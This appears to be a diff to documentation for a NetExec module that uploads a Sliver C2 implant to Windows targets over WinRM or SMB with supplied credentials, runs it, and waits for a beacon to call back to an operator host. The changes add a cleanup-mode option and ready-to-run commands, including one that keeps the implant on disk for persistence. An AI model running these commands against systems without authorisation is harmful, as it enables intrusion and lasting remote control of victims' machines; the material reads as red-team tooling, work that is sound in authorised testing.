@@ -60,7 +60,7 @@ nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
 4. Implant uploaded to `C:\Windows\Temp\` via WinRM
 5. Implant executed on target
 6. Module waits 90 seconds for beacon callback
-7. Implant file deleted from target (CLEANUP=True by default)
+7. Implant file deleted from target (CLEANUP_MODE=always by default)
 
 **Note:** `RPORT` defaults to 443 if not specified. To use a different port, add `RPORT=8888`.
 
@@ -322,7 +322,7 @@ nxc smb 10.2.10.0/24 -u admin -p 'SecurePass123' \
 | `OS` | Auto-detect | Target OS (`windows` or `linux`) |
 | `ARCH` | `amd64` | Target architecture (`amd64` or `386`) |
 | `IMPLANT_BASE_PATH` | `/tmp` | Local temp directory for implant generation |
-| `CLEANUP` | `True` | Remove implant file from target after beacon callback |
+| `CLEANUP_MODE` | `always` | When to cleanup: `always`, `success` (only if beacon registers), or `never` |
 | `WAIT` | `90` | Seconds to wait for beacon callback |
 | `FORMAT` | `exe` | Implant format (only `exe` supported currently) |
 | `STAGING` | `False` | Staging mode: `http`, `tcp`, `https`, or `False` to disable |
@@ -373,13 +373,41 @@ nxc winrm 192.168.1.10 -u admin -p pass \
 
 **Use case:** Store generated implants in specific directory for forensics/analysis.
 
-### Disable Cleanup (Keep Implant on Target)
+### Cleanup Modes
 
+Control when artifacts are removed from the target system:
+
+#### Always Cleanup (Default)
 ```bash
 nxc winrm 192.168.1.10 -u admin -p pass \
   -M sliver_exec \
-  -o RHOST=10.0.0.5 RPORT=8888 CLEANUP=False
+  -o RHOST=10.0.0.5 CLEANUP_MODE=always
 ```
+
+Removes implant file and staging artifacts regardless of beacon registration success.
+
+#### Cleanup Only on Success
+```bash
+nxc winrm 192.168.1.10 -u admin -p pass \
+  -M sliver_exec \
+  -o RHOST=10.0.0.5 CLEANUP_MODE=success
+```
+
+Only removes artifacts if the beacon successfully registers with the C2 server.
+
+**Use case:** 
+- Troubleshooting deployment failures (failed implants remain on disk for analysis)
+- Reduces noise from failed deployments
+- Forensic analysis of execution issues
+
+#### Never Cleanup
+```bash
+nxc winrm 192.168.1.10 -u admin -p pass \
+  -M sliver_exec \
+  -o RHOST=10.0.0.5 CLEANUP_MODE=never
+```
+
+Keeps implant on disk for persistence or re-execution.
 
 **Use case:** 
 - Persistence (implant remains on disk)
